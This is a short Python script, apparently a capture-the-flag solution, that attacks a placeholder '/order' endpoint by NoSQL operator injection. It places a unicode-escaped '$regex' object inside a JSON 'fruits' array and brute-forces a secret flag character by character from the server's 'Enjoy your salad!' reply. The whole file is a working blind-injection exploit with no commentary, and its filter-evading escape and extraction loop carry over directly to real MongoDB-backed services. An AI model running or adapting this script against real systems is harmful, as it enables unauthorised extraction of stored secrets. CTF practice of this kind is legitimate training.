import string
import requests

url = "<site-url>/order"

unicode_char = string.ascii_letters + string.digits + "}"
flag = "CTF{"

while True:
    ok = False
    for char in unicode_char:
        req = '''
            {
    "fruits": [
        "Grape",
        "Grape",
        "Grape",
        {"\\u0024regex": "^''' + flag + char + '''"},
        "Grape"
    ]
}
        '''
        http_res = requests.post(url=url,data=req,headers={"Content-Type": "application/json"})
        response = http_res.json().get("message","")
        print(f"{flag + char}, {response}")
        if(response == "Enjoy your salad!"):
            flag+=char
            ok = True
            print(f'Partial flag : {flag}')
            if(char == "}"):
                print(f'Flag found: {flag}')
                exit(0)
            break

